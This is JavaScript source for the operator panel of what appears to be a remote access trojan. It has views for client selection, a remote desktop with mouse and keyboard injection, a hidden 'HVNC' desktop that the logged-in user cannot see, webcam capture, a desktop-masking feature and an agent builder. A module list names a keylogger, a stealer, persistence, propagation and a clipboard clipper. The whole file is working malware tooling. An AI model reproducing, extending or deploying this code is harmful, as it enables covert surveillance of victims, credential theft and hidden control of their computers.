        '<p>Nothing selected means a dash</p></div><div class="card-body" id="clSel">' + clientSelection() + "</div></div>";
  },
  mount(v) {
    const open = (id) => {
      setClient(id);
      S.manualClear = false;
      S.clientMeta = null;
      S.connected = false;
      S.info = {};
      S.features = [];
      S.keylog.text = "";
      S.chat.messages = [];
      S.chat.unread = 0;
      state().then(() => { go("overview"); }).catch(fail);
    };
    $$("[data-client]", v).forEach((el) => {
      el.onclick = (ev) => {
        if (ev.target.closest("[data-open]")) return;
        open(el.dataset.client);
      };
    });
    $$("[data-open]", v).forEach((b) => b.onclick = (e) => {
      e.stopPropagation();
      open(b.dataset.open);
    });
    $("#clRefresh", v).onclick = (e) => run(e.currentTarget, async () => {
      await state(); render(); toast("Client list refreshed", "ok");
    });
    $("#clBuild", v).onclick = () => go("builder");
    const sel = $("#clOpenSel");
    if (sel) sel.onclick = () => go("overview");
    const clear = $("#clClear");
    if (clear) clear.onclick = () => {
      setClient(""); S.manualClear = true; S.clientMeta = null; S.connected = false; S.info = {}; S.features = [];
      render();
    };
  },
};

/* ================================================================ overview */
VIEWS.overview = {
  title: "Overview",
  sub: () => S.connected ? "Session live on " + (S.info.hostname || "this host") : "Client selected but offline · waiting for it to reconnect",
  render() {
    const i = S.info || {};
    const online = S.connected;
    return '' +
      '<section class="hero">' +
        '<div class="eyebrow">' + icon("shield") + " session</div>" +
        '<h2>' + esc(online ? (i.hostname || "client") : "no live session") + '</h2>' +
        '<p>' + (online
          ? "Modules below drive " + esc(i.hostname || "this client") + ". Every command carries the client id, so other attached machines are untouched."
          : "The selected client is not attached right now. Pick another one under Clients, or start its agent again.") + '</p>' +
        '<div class="hero-actions">' +
          '<button class="btn btn-primary" data-act="desktop">' + icon("monitor") + " Open desktop</button>" +
          '<button class="btn" data-act="files">' + icon("folder") + " File manager</button>" +
          '<button class="btn" data-act="clients">' + icon("radar") + " Clients</button>" +
          '<button class="btn" data-act="builder">' + icon("box") + " Build agent</button>" +
        '</div>' +
      '</section>' +
      '<div class="grid grid-4" id="ovStats">' + overviewStats(i, online) + '</div>' +
      '<div class="grid grid-3" style="margin-top:16px">' +
        '<div class="card span-2">' +
          '<div class="card-head"><h3>Agent</h3><p>Handshake payload</p>' +
            '<div class="right"><span class="badge ' + (online ? "ok" : "bad") + '">' + (online ? "connected" : "offline") + '</span></div></div>' +
          '<div class="card-body" id="ovInfo">' + overviewInfo(i, online) + '</div>' +
        '</div>' +
        '<div class="card">' +
          '<div class="card-head"><h3>Event stream</h3><div class="right">' +
            '<button class="btn btn-sm btn-ghost" id="clearLog">Clear</button></div></div>' +
          '<div class="card-body tight"><div class="log" id="ovLog"></div></div>' +
        '</div>' +
      '</div>' +
      '<div class="card" style="margin-top:16px">' +
        '<div class="card-head"><h3>Modules</h3><p>Features compiled into this agent</p>' +
          '<div class="right"><span class="badge violet">' + (S.features.length || 0) + ' enabled</span></div></div>' +
        '<div class="card-body" id="ovFeat">' + overviewFeatures() + '</div>' +
      '</div>';
  },
  mount(v) {
    $$("[data-act]", v).forEach((b) => b.addEventListener("click", () => go(b.dataset.act)));
    const clear = $("#clearLog");
    if (clear) clear.onclick = () => { S.logs = []; paintLog("#ovLog"); };
    paintLog("#ovLog");
    if (S.connected) {
      cmd("sysinfo").then((info) => {
        S.info = Object.assign({}, S.info, info);
        const s = $("#ovStats"), n = $("#ovInfo");
        if (s) s.innerHTML = overviewStats(S.info, true);
        if (n) n.innerHTML = overviewInfo(S.info, true);
      }).catch(() => {});
    }
  },
};

function overviewStats(i, online) {
  if (!online) {
    return '<div class="card stat"><div class="stat-label">Client</div><div class="stat-val">offline</div><div class="stat-sub">' + esc((selectedClient() && (selectedClient().info || {}).hostname) || "—") + '</div></div>' +
      '<div class="card stat"><div class="stat-label">Clients</div><div class="stat-val">' + (S.clients.length || "—") + '</div><div class="stat-sub">attached to this panel</div></div>' +
      '<div class="card stat"><div class="stat-label">Agent port</div><div class="stat-val">' + esc(S.agentPort || 8790) + '</div><div class="stat-sub">multi-client listener</div></div>' +
      '<div class="card stat"><div class="stat-label">Modules</div><div class="stat-val">' + (S.features.length || "—") + '</div><div class="stat-sub">built into this agent</div></div>';
  }
  const cpu = Number(i.cpuLoad || 0);
  const ram = Number(i.ramPercent || 0);
  const disk = i.diskTotal ? (i.diskUsed / i.diskTotal) * 100 : 0;
  return statCard("CPU load", cpu.toFixed(0) + "%", (i.cores || "?") + " logical cores", cpu) +
    statCard("Memory", pct(ram), bytes(i.ramUsed) + " / " + bytes(i.ramTotal), ram) +
    statCard("System disk", pct(disk), bytes(i.diskUsed) + " / " + bytes(i.diskTotal), disk) +
    statCard("Uptime", dur(i.uptime || 0), "pid " + (i.pid || "?") + " · " + (i.admin ? "elevated" : "standard user"));
}

function overviewInfo(i, online) {
  if (!online) return '<div class="empty">' + icon("wifi") + 'Run <b>agent.bat</b> from a build to attach.<br><span class="small">Port ' + esc(S.agentPort || 8790) + ' · token in runtime/token.txt</span></div>';
  return kv([
    ["Hostname", i.hostname || "?"],
    ["User", (i.domain ? i.domain + "\\" : "") + (i.username || "?")],
    ["OS", i.os || "?"],
    ["Architecture", (i.arch || "?") + " · Python " + (i.python || "?")],
    ["CPU", i.cpu || "?"],
    ["Monitors", String(i.monitors || 1)],
    ["Elevation", i.admin ? "administrator" : "standard user"],
    ["Label", i.label || "local"],
    ["Agent exe", i.exe || "?"],
    ["Connected", when(S.connectedAt || 0)],
  ]);
}

function overviewFeatures() {
  const all = ["screen", "input", "files", "processes", "shell", "registry", "clipboard", "keylog",
    "audio", "tts", "power", "messagebox", "chat", "windows", "hvnc", "webcam", "mic",
    "desktop_audio", "stealer", "recon", "persistence", "propagation", "proxy", "plugins",
    "rustdesk", "clipper", "control"];
  return '<div class="hstack">' + all.map((f) =>
    '<span class="badge ' + (S.features.indexOf(f) !== -1 ? "violet" : "") + '">' +
    (S.features.indexOf(f) !== -1 ? "● " : "○ ") + esc(f) + "</span>").join("") + "</div>";
}

/* ------------------------------------------------------------ live streams -- */
/* One multipart JPEG connection per view. The server pushes parts, the browser
   decodes them into a canvas, so there is no request-per-frame overhead. */
const LIVE = { gen: 0, ctrl: null };

function stopStream() {
  LIVE.gen += 1;
  if (LIVE.ctrl) {
    try { LIVE.ctrl.abort(); } catch (e) { /* already closed */ }
  }
  LIVE.ctrl = null;
}

function streamUrl(path, params) {
  const q = Object.assign({ client: S.client, token: S.token }, params || {});
  return path + "?" + Object.keys(q).map((k) => k + "=" + encodeURIComponent(q[k])).join("&");
}

function attachStream(opts) {
  const canvas = opts.canvas;
  const ctx = canvas.getContext("2d", { alpha: false });
  let frames = 0;
  let since = performance.now();
  let lastPaint = performance.now();

  stopStream();
  const gen = ++LIVE.gen;
  const ctrl = new AbortController();
  LIVE.ctrl = ctrl;
  const alive = () => gen === LIVE.gen;

  const paint = (src, w, h) => {
    if (canvas.width !== w || canvas.height !== h) {
      canvas.width = w;
      canvas.height = h;
    }
    ctx.drawImage(src, 0, 0, w, h);
    frames += 1;
    lastPaint = performance.now();
    const now = performance.now();
    if (now - since >= 900) {
      const fps = Math.round((frames * 1000) / (now - since));
      frames = 0;
      since = now;
      if (opts.onStats) opts.onStats({ fps, width: w, height: h });
    }
  };

  const show = (bytes) => new Promise((resolve) => {
    const blob = new Blob([bytes], { type: "image/jpeg" });
    if (typeof createImageBitmap === "function") {
      createImageBitmap(blob).then((bmp) => {
        paint(bmp, bmp.width, bmp.height);
        if (bmp.close) bmp.close();
        resolve();
      }).catch(resolve);
      return;
    }
    const url = URL.createObjectURL(blob);
    const img = new Image();
    img.onload = () => {
      paint(img, img.naturalWidth, img.naturalHeight);
      URL.revokeObjectURL(url);
      resolve();
    };
    img.onerror = () => { URL.revokeObjectURL(url); resolve(); };
    img.src = url;
  });

  const header = (buf) => {
    for (let i = 0; i + 3 < buf.length; i++) {
      if (buf[i] === 13 && buf[i + 1] === 10 && buf[i + 2] === 13 && buf[i + 3] === 10) {
        let text = "";
        for (let k = 0; k < i; k++) text += String.fromCharCode(buf[k]);
        return { text, body: i + 4 };
      }
    }
    return null;
  };

  const join = (a, b) => {
    const out = new Uint8Array(a.length + b.length);
    out.set(a, 0);
    out.set(b, a.length);
    return out;
  };

  const wait = (ms) => new Promise((r) => setTimeout(r, ms));

  const run = async () => {
    while (alive()) {
      let res;
      try {
        res = await fetch(opts.url(), { signal: ctrl.signal, cache: "no-store" });
      } catch (e) {
        if (!alive()) return;
        await wait(1200);
        continue;
      }
      if (!res.ok || !res.body) {
        if (opts.onError) opts.onError(new Error("stream answered " + res.status));
        await wait(1200);
        continue;
      }
      const reader = res.body.getReader();
      let buf = new Uint8Array(0);
      try {
        for (;;) {
          const chunk = await reader.read();
          if (chunk.done || !alive()) break;
          buf = join(buf, chunk.value);
          for (;;) {
            const part = header(buf);
            if (!part) break;
            const m = /content-length:\s*(\d+)/i.exec(part.text);
            const len = m ? Number(m[1]) : 0;
            if (!len) { buf = buf.slice(part.body); continue; }
            if (buf.length < part.body + len + 2) break;
            const bytes = buf.slice(part.body, part.body + len);
            buf = buf.slice(part.body + len + 2);
            await show(bytes);
          }
        }
      } catch (e) {
        if (!alive()) return;
      }
      if (!alive()) return;
      await wait(1000);
    }
  };

  run();

  return {
    stop() {
      if (gen === LIVE.gen) stopStream();
    },
    idleFor: () => Math.round(performance.now() - lastPaint),
  };
}

/* ================================================================= desktop */
VIEWS.desktop = {
  title: "Remote desktop",
  sub: "Multipart JPEG over /api/stream · absolute mouse · scan-code keys",
  render() {
    if (!S.connected) return offlineCard("The desktop module needs a live agent.");
    const fpsOpts = [10, 15, 20, 30, 40, 60];
    const scaleOpts = [[1, "100%"], [0.85, "85%"], [0.75, "75%"], [0.5, "50%"]];
    return pageHead("Remote desktop", "Live screen with input injection.",
      '<button class="btn btn-sm" id="dSnap">' + icon("camera") + ' Snapshot</button>' +
      '<button class="btn btn-sm" id="dMask">' + icon("eye") + ' Mask</button>' +
      '<button class="btn btn-sm" id="dLift">' + icon("eye") + ' Lift</button>') +
      requireFeature("screen") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 288px">' +
        '<div class="card pad">' +
          '<div class="screen-wrap" id="screenWrap">' +
            '<canvas id="screenCanvas" width="1280" height="720" tabindex="0"></canvas>' +
            '<div class="hud">' +
              '<span id="hudRes">—</span>' +
              '<span id="hudMon">mon 1</span>' +
              '<span id="hudFps">0 fps</span>' +
            '</div>' +
          '</div>' +
          '<p class="small muted" style="margin:10px 2px 0">Move to steer · drag to select · right-click for context · wheel scrolls · keys go to the focused window.</p>' +
        '</div>' +
        '<div class="stack">' +
          '<div class="card pad form-stack">' +
            '<div class="field"><label>Monitor</label><select class="select" id="dMonitor"></select></div>' +
            '<div class="field"><label>Frame rate</label><select class="select" id="dFps">' +
              fpsOpts.map((n) => '<option value="' + n + '"' + (S.screen.fps === n ? " selected" : "") + ">" + n + " fps</option>").join("") +
            '</select></div>' +
            '<div class="field"><label>Quality <span class="muted" id="dQVal">' + S.screen.quality + '</span></label>' +
              '<input type="range" id="dQuality" min="25" max="90" value="' + S.screen.quality + '"></div>' +
            '<div class="field"><label>Resolution</label><select class="select" id="dScale">' +
              scaleOpts.map((o) => '<option value="' + o[0] + '"' + (S.screen.scale === o[0] ? " selected" : "") + ">" + o[1] + " of monitor</option>").join("") +
            '</select></div>' +
          '</div>' +
          '<div class="card pad">' +
            '<div class="stat-label" style="margin-bottom:8px">Keyboard</div>' +
            '<div class="field"><input class="input" id="dType" placeholder="Type text, press Enter">' +
            '<button class="btn btn-sm" id="dTypeBtn" style="margin-top:6px">Send text</button></div>' +
            '<label class="check" style="margin-top:10px"><input type="checkbox" id="dCapture">' +
              '<span><b>Capture keyboard</b><small>Send keystrokes while this view is open</small></span></label>' +
            '<div class="divider"></div>' +
            '<div class="hstack" id="dVks">' +
              [["Esc", 27], ["Tab", 9], ["Enter", 13], ["Back", 8], ["Del", 46], ["↑", 38], ["↓", 40], ["←", 37], ["→", 39], ["Win", 91]]
                .map((k) => '<button class="btn btn-sm" data-vk="' + k[1] + '">' + k[0] + "</button>").join("") +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>';
  },
  mount(v) {
    const canvas = $("#screenCanvas", v);
    if (!canvas) return;
    const hudRes = $("#hudRes", v), hudMon = $("#hudMon", v), hudFps = $("#hudFps", v);
    let live = null;

    const start = () => {
      if (live) live.stop();
      if (hudFps) hudFps.textContent = "…";
      live = attachStream({
        canvas,
        url: () => streamUrl("/api/stream", {
          q: S.screen.quality, fps: S.screen.fps,
          m: S.screen.monitor, s: S.screen.scale, t: Date.now(),
        }),
        onStats: (st) => {
          if (hudRes) hudRes.textContent = st.width + "×" + st.height;
          if (hudMon) hudMon.textContent = "mon " + (S.screen.monitor + 1);
          if (hudFps) hudFps.textContent = st.fps + " fps";
        },
        onError: () => { if (hudFps) hudFps.textContent = "no signal"; },
      });
    };

    cmd("monitors").then((m) => {
      S.screen.monitors = m.monitors || [];
      const sel = $("#dMonitor", v);
      if (!sel) return;
      sel.innerHTML = S.screen.monitors.map((x) =>
        '<option value="' + x.index + '">' + (x.index + 1) + " · " + x.width + "×" + x.height + "</option>").join("") ||
        '<option value="0">1</option>';
      sel.value = String(S.screen.monitor);
    }).catch(() => {
      const sel = $("#dMonitor", v);
      if (sel) sel.innerHTML = Array.from({ length: S.info.monitors || 1 }, (_, n) =>
        '<option value="' + n + '">Monitor ' + (n + 1) + "</option>").join("");
    });

    start();

    const q = $("#dQuality", v);
    if (q) {
      q.oninput = () => { $("#dQVal", v).textContent = q.value; };
      q.onchange = () => { S.screen.quality = Number(q.value); start(); };
    }
    const mon = $("#dMonitor", v);
    if (mon) mon.onchange = () => { S.screen.monitor = Number(mon.value); start(); };
    const fps = $("#dFps", v);
    if (fps) fps.onchange = () => { S.screen.fps = Number(fps.value); start(); };
    const scale = $("#dScale", v);
    if (scale) scale.onchange = () => { S.screen.scale = Number(scale.value); start(); };

    const point = (ev) => {
      const r = canvas.getBoundingClientRect();
      const px = (ev.clientX - r.left) / Math.max(1, r.width) * canvas.width;
      const py = (ev.clientY - r.top) / Math.max(1, r.height) * canvas.height;
      const mo = S.screen.monitors[S.screen.monitor] || { left: 0, top: 0 };
      const s = S.screen.scale || 1;
      return {
        x: Math.round((mo.left || 0) + px / s),
        y: Math.round((mo.top || 0) + py / s),
      };
    };
    const send = (p, action, extra) =>
      cmd("mouse", Object.assign({ action, x: p.x, y: p.y }, extra || {})).catch(() => {});

    /* Pointer moves are coalesced: the agent gets the newest position at most
       ~33 times a second instead of one POST per browser event. */
    let pending = null;
    let pump = 0;
    const flush = () => {
      pump = 0;
      if (!pending || S.route !== "desktop") return;
      const p = pending;
      pending = null;
      send(p, "move");
    };
    canvas.addEventListener("pointermove", (ev) => {
      pending = point(ev);
      if (!pump) pump = setTimeout(flush, 33);
    });
    canvas.addEventListener("pointerleave", () => { pending = null; });
    canvas.addEventListener("pointerdown", (ev) => {
      canvas.focus();
      if (ev.button === 0) send(point(ev), "down");
    });
    canvas.addEventListener("pointerup", (ev) => {
      if (ev.button === 0) send(point(ev), "up");
    });
    canvas.addEventListener("dblclick", (ev) => send(point(ev), "double"));
    canvas.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      send(point(ev), "right");
    });
    canvas.addEventListener("wheel", (ev) => {
      ev.preventDefault();
      send(point(ev), "wheel", { delta: ev.deltaY < 0 ? 120 : -120 });
    }, { passive: false });

    const typeBox = $("#dType", v);
    const sendText = () => {
      const text = typeBox.value;
      if (!text) return;
      cmd("key", { text }).then(() => toast("Text sent", "ok")).catch(fail);
      typeBox.value = "";
    };
    $("#dTypeBtn", v).onclick = sendText;
    typeBox.addEventListener("keydown", (ev) => { if (ev.key === "Enter") sendText(); });
    $$("[data-vk]", v).forEach((b) => b.addEventListener("click", () => {
      cmd("key", { vk: Number(b.dataset.vk) }).catch(fail);
    }));

    const cap = $("#dCapture", v);
    if (cap) cap.onchange = () => {
      if (cap.checked) {
        S._keyHandler = (ev) => {
          const t = ev.target;
          if (t && /INPUT|TEXTAREA|SELECT/.test(t.tagName)) return;
          if (S.route !== "desktop") return;
          if (ev.key.length === 1) cmd("key", { text: ev.key }).catch(() => {});
          else {
            const map = { Escape: 27, Tab: 9, Enter: 13, Backspace: 8, Delete: 46, ArrowUp: 38, ArrowDown: 40, ArrowLeft: 37, ArrowRight: 39 };
            if (map[ev.key]) cmd("key", { vk: map[ev.key] }).catch(() => {});
          }
          ev.preventDefault();
        };
        document.addEventListener("keydown", S._keyHandler);
      } else if (S._keyHandler) {
        document.removeEventListener("keydown", S._keyHandler);
        S._keyHandler = null;
      }
    };

    $("#dMask", v).onclick = (e) => run(e.currentTarget, async () => {
      const ok = await confirmBox("Mask the desktop",
        "Hides the wallpaper and taskbar on the host machine. Ctrl+Alt+L on that " +
        "keyboard lifts it, and it lifts itself after 5 minutes.", true);
      if (!ok) return;
      const r = await cmd("mask", { ttl: 300 });
      toast("Masked · lifts in " + Math.round((r.ttl || 300) / 60) + " min", "ok");
    });
    $("#dLift", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("lift");
      toast(r.shell_restarted ? "Desktop restored · shell restarted" : "Desktop restored", "ok");
    });

    /* the button doubles as the only visible sign that the host is masked */
    const maskBtn = $("#dMask", v);
    const pollMask = async () => {
      if (S.route !== "desktop" || !maskBtn) return;
      try {
        const st = await cmd("mask_status");
        if (st.masked) {
          const left = st.expires_in || 0;
          maskBtn.textContent = "Masked " + Math.floor(left / 60) + ":" +
            String(left % 60).padStart(2, "0");
          maskBtn.classList.add("btn-danger");
        } else {
          maskBtn.innerHTML = icon("eye") + " Mask";
          maskBtn.classList.remove("btn-danger");
        }
      } catch (e) { /* agent busy */ }
    };
    pollMask();
    every(pollMask, 5000);
    $("#dSnap", v).onclick = (e) => run(e.currentTarget, async () => {
      const url = streamUrl("/api/screen", { q: 92, m: S.screen.monitor, t: Date.now() });
      const blob = await (await fetch(url)).blob();
      const u = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = u; a.download = "screen-" + Date.now() + ".jpg"; a.click();
      setTimeout(() => URL.revokeObjectURL(u), 4000);
    });
  },
};

/* ==================================================================== hvnc */
VIEWS.hvnc = {
  title: "HVNC",
  sub: "Hidden desktop · CreateDesktopW · desktop-surface capture",
  render() {
    if (!S.connected) return offlineCard("HVNC needs a live agent.");
    const fpsOpts = [10, 15, 20, 30, 40, 60];
    const scaleOpts = [[1, "100%"], [0.85, "85%"], [0.75, "75%"], [0.5, "50%"]];
    return pageHead("Hidden desktop", "A second desktop the logged-in user cannot see.",
      '<button class="btn btn-sm btn-primary" id="hStart">' + icon("play") + ' Start</button>' +
      '<button class="btn btn-sm" id="hStop">' + icon("stop") + ' Stop</button>' +
      '<button class="btn btn-sm" id="hRefresh">' + icon("refresh") + ' Windows</button>') +
      requireFeature("hvnc") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 300px">' +
        '<div class="card pad">' +
          '<div class="screen-wrap" id="hWrap">' +
            '<canvas id="hCanvas" width="1280" height="720" tabindex="0"></canvas>' +
            '<div class="hud">' +
              '<span id="hState">closed</span>' +
              '<span id="hMode">—</span>' +
              '<span id="hFps">0 fps</span>' +
              '<span id="hWins">0 windows</span>' +
            '</div>' +
          '</div>' +
          '<div class="hstack" style="margin-top:10px">' +
            '<input class="input" id="hType" placeholder="Type into the focused window" style="flex:1">' +
            '<button class="btn btn-sm" id="hSend">Send</button>' +
            '<button class="btn btn-sm" id="hClipGet">Get clipboard</button>' +
            '<button class="btn btn-sm" id="hClipSet">Set clipboard</button>' +
          '</div>' +
        '</div>' +
        '<div class="stack">' +
          '<div class="card pad form-stack">' +
            '<div class="field"><label>Launch process</label><input class="input" id="hProc" placeholder="notepad.exe"></div>' +
            '<button class="btn btn-sm" id="hRun">' + icon("play") + ' Launch on hidden desktop</button>' +
            '<div class="field"><label>Frame rate</label><select class="select" id="hFpsSel">' +
              fpsOpts.map((n) => '<option value="' + n + '"' + (S.hvnc.fps === n ? " selected" : "") + ">" + n + " fps</option>").join("") +
            '</select></div>' +
            '<div class="field"><label>Quality <span class="muted" id="hQVal">' + S.hvnc.quality + '</span></label>' +
              '<input type="range" id="hQ" min="25" max="90" value="' + S.hvnc.quality + '"></div>' +
            '<div class="field"><label>Resolution</label><select class="select" id="hScale">' +
              scaleOpts.map((o) => '<option value="' + o[0] + '"' + (S.hvnc.scale === o[0] ? " selected" : "") + ">" + o[1] + " of desktop</option>").join("") +
            '</select></div>' +
          '</div>' +
          '<div class="card"><div class="card-head"><h3>Windows</h3><div class="right"><span class="badge" id="hCount">0</span></div></div>' +
            '<div class="card-body flush" id="hList"><div class="empty">Start the desktop.</div></div></div>' +
          '<div class="card"><div class="card-head"><h3>Processes</h3></div>' +
            '<div class="card-body flush" id="hProcs"><div class="empty">Start the desktop.</div></div></div>' +
        '</div>' +
      '</div>';
  },
  mount(v) {
    const canvas = $("#hCanvas", v);
    if (!canvas) return;
    const hudState = $("#hState", v), hudMode = $("#hMode", v), hudFps = $("#hFps", v);
    let live = null;

    const start = () => {
      if (live) live.stop();
      if (hudFps) hudFps.textContent = "…";
      live = attachStream({
        canvas,
        url: () => streamUrl("/api/hvnc", {
          q: S.hvnc.quality, fps: S.hvnc.fps, s: S.hvnc.scale, t: Date.now(),
        }),
        onStats: (st) => {
          if (hudFps) hudFps.textContent = st.fps + " fps";
        },
        onError: () => { if (hudFps) hudFps.textContent = "no signal"; },
      });
    };

    const refreshStatus = async () => {
      try {
        const st = await cmd("hvnc_status");
        S.hvnc.open = !!st.open;
        S.hvnc.mode = st.mode || "";
        if (hudState) hudState.textContent = st.open ? "desktop " + st.desktop : "closed";
        if (hudMode) hudMode.textContent = st.mode ? st.mode + (st.error ? " · " + st.error : "") : "—";
      } catch (e) { /* agent may be gone */ }
    };

    const loadWindows = async () => {
      try {
        const r = await cmd("hvnc_windows");
        const rows = r.windows || [];
        const list = $("#hList", v);
        if (!list) return;
        list.innerHTML = table(["Title", "PID", "Rect", ""], rows, (w) =>
          "<tr><td>" + esc(w.title || "(untitled)") + '</td><td class="mono">' + w.pid +
          '</td><td class="mono">' + w.left + "," + w.top + " " + w.width + "×" + w.height +
          '</td><td><button class="btn btn-sm" data-hwnd="' + w.hwnd + '">Target</button></td></tr>', "No windows.");
        $$("[data-hwnd]", list).forEach((b) => b.onclick = () => {
          S.hvnc.hwnd = Number(b.dataset.hwnd);
          toast("Target window " + S.hvnc.hwnd, "ok");
        });
        const c = $("#hCount", v); if (c) c.textContent = rows.length;
        const hw = $("#hWins", v); if (hw) hw.textContent = rows.length + " windows";
      } catch (e) {
        const list = $("#hList", v);
        if (list) list.innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
      }
    };

    const loadProcs = async () => {
      try {
        const r = await cmd("hvnc_processes");
        const rows = r.processes || [];
        const host = $("#hProcs", v);
        if (!host) return;
        host.innerHTML = table(["Process", "PID", "RSS", ""], rows, (p) =>
          "<tr><td>" + esc(p.name) + '</td><td class="mono">' + p.pid + '</td><td class="num">' + bytes(p.rss) +
          '</td><td><button class="btn btn-sm btn-danger" data-kill="' + p.pid + '">Kill</button></td></tr>', "No processes.");
        $$("[data-kill]", host).forEach((b) => b.onclick = (e) => run(e.currentTarget, async () => {
          await cmd("hvnc_kill_process", { pid: Number(b.dataset.kill) });
          toast("Process killed", "ok");
          loadProcs();
        }));
      } catch (e) { /* desktop closed */ }
    };

    /* Canvas coordinates are desktop coordinates. Divide out the capture
       scale, then let the agent resolve the window under the point. */
    const point = (ev) => {
      const r = canvas.getBoundingClientRect();
      const s = S.hvnc.scale || 1;
      return {
        x: Math.round((ev.clientX - r.left) / Math.max(1, r.width) * canvas.width / s),
        y: Math.round((ev.clientY - r.top) / Math.max(1, r.height) * canvas.height / s),
      };
    };
    const send = (p, action, extra) => {
      if (!S.hvnc.open) return;
      cmd("hvnc_input", Object.assign({ type: "mouse", action, x: p.x, y: p.y, hwnd: S.hvnc.hwnd }, extra || {}))
        .catch(() => {});
    };

    let pending = null;
    let pump = 0;
    const flush = () => {
      pump = 0;
      if (!pending || S.route !== "hvnc") return;
      const p = pending;
      pending = null;
      send(p, "move");
    };
    canvas.addEventListener("pointermove", (ev) => {
      pending = point(ev);
      if (!pump) pump = setTimeout(flush, 33);
    });
    canvas.addEventListener("pointerleave", () => { pending = null; });
    canvas.addEventListener("pointerdown", (ev) => {
      canvas.focus();
      if (ev.button === 0) send(point(ev), "down");
    });
    canvas.addEventListener("pointerup", (ev) => {
      if (ev.button === 0) send(point(ev), "up");
    });
    canvas.addEventListener("dblclick", (ev) => send(point(ev), "double"));
    canvas.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      send(point(ev), "right");
    });
    canvas.addEventListener("wheel", (ev) => {
      ev.preventDefault();
      send(point(ev), "wheel", { delta: ev.deltaY < 0 ? 120 : -120 });
    }, { passive: false });
    canvas.addEventListener("keydown", (ev) => {
      if (!S.hvnc.open) return;
      if (ev.key.length === 1) {
        cmd("hvnc_input", { type: "text", text: ev.key, hwnd: S.hvnc.hwnd }).catch(() => {});
      } else {
        const map = { Escape: 27, Tab: 9, Enter: 13, Backspace: 8, Delete: 46, ArrowUp: 38, ArrowDown: 40, ArrowLeft: 37, ArrowRight: 39 };
        if (map[ev.key]) cmd("hvnc_input", { type: "key", vk: map[ev.key], hwnd: S.hvnc.hwnd }).catch(() => {});
      }
      ev.preventDefault();
    });

    $("#hStart", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("hvnc_start", {}, 30);
      S.hvnc.open = true;
      if (hudMode && r.mode) hudMode.textContent = r.mode;
      if (r.error) toast(r.error, "err");
      toast("Hidden desktop created", "ok");
      await refreshStatus();
      start();
      loadWindows();
      loadProcs();
    });
    $("#hStop", v).onclick = (e) => run(e.currentTarget, async () => {
      if (live) live.stop();
      await cmd("hvnc_stop");
      S.hvnc.open = false;
      canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height);
      if (hudFps) hudFps.textContent = "0 fps";
      const wins = $("#hWins", v); if (wins) wins.textContent = "0 windows";
      toast("Hidden desktop closed", "ok");
      await refreshStatus();
    });
    $("#hRefresh", v).onclick = (e) => run(e.currentTarget, async () => { await loadWindows(); await loadProcs(); });
    $("#hRun", v).onclick = (e) => run(e.currentTarget, async () => {
      const path = $("#hProc", v).value.trim();
      if (!path) throw new Error("process path required");
      await cmd("hvnc_start_process", { path });
      toast("Launched " + path, "ok");
      later(loadWindows, 900);
    });
    $("#hSend", v).onclick = () => {
      const box = $("#hType", v);
      if (!box.value) return;
      cmd("hvnc_input", { type: "text", text: box.value, hwnd: S.hvnc.hwnd })
        .then(() => { box.value = ""; }).catch(fail);
    };
    $("#hType", v).addEventListener("keydown", (ev) => { if (ev.key === "Enter") $("#hSend", v).click(); });
    $("#hClipGet", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("hvnc_clipboard");
      modal("Hidden desktop clipboard", '<textarea class="textarea" readonly>' + esc(r.text || "") + "</textarea>");
    });
    $("#hClipSet", v).onclick = () => {
      const m = modal("Set clipboard", '<textarea class="textarea" id="hClipBox" placeholder="Text"></textarea>',
        '<button class="btn btn-primary" data-ok>Set</button>');
      $("[data-ok]", m.el).onclick = async () => {
        try { await cmd("hvnc_clipboard", { text: $("#hClipBox", m.el).value }); m.close(); toast("Clipboard set", "ok"); }
        catch (e) { fail(e); }
      };
    };

    const q = $("#hQ", v);
    if (q) {
      q.oninput = () => { $("#hQVal", v).textContent = q.value; };
      q.onchange = () => { S.hvnc.quality = Number(q.value); if (S.hvnc.open) start(); };
    }
    const fpsSel = $("#hFpsSel", v);
    if (fpsSel) fpsSel.onchange = () => { S.hvnc.fps = Number(fpsSel.value); if (S.hvnc.open) start(); };
    const scaleSel = $("#hScale", v);
    if (scaleSel) scaleSel.onchange = () => { S.hvnc.scale = Number(scaleSel.value); if (S.hvnc.open) start(); };

    refreshStatus().then(() => {
      if (S.hvnc.open) { start(); loadWindows(); loadProcs(); }
      else canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height);
    });
    every(() => { if (S.route === "hvnc" && S.hvnc.open) loadWindows(); }, 6000);
  },
};

/* ================================================================== webcam */
VIEWS.webcam = {
  title: "Webcam",
  sub: "OpenCV capture on the agent host",
  render() {
    if (!S.connected) return offlineCard("The webcam module needs a live agent.");
    return pageHead("Webcam", "DirectShow capture, JPEG per frame.",
      '<button class="btn btn-sm" id="wList">' + icon("refresh") + ' Devices</button>' +
      '<button class="btn btn-sm" id="wSnap">' + icon("download") + ' Snapshot</button>' +
      '<button class="btn btn-sm btn-danger" id="wStop">' + icon("stop") + ' Stop</button>') +
      requireFeature("webcam") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 300px">' +
        '<div class="card pad"><div class="media-frame" id="wFrame">' +
          '<div class="media-empty">' + icon("camera") + 'No device selected.</div>' +
        '</div><div class="hstack" style="margin-top:10px"><span class="small muted" id="wInfo">idle</span></div></div>' +
        '<div class="stack"><div class="card"><div class="card-head"><h3>Devices</h3></div>' +
          '<div class="card-body flush" id="wDevices"><div class="empty">Detect devices.</div></div></div>' +
          '<div class="card pad form-stack"><div class="field"><label>Quality</label>' +
            '<input type="range" id="wQ" min="30" max="92" value="' + S.webcam.quality + '"></div>' +
            '<div class="note">' + icon("info") + '<div>Each frame opens and closes the device. Lower the rate on slow cameras.</div></div>' +
          '</div></div>' +
      '</div>';
  },
  mount(v) {
    const frame = $("#wFrame", v);
    const show = (b64) => {
      frame.innerHTML = '<img alt="webcam" src="data:image/jpeg;base64,' + b64 + '">';
    };
    const tick = async () => {
      if (S.route !== "webcam" || S.webcam.busy || !S.webcam.active) return;
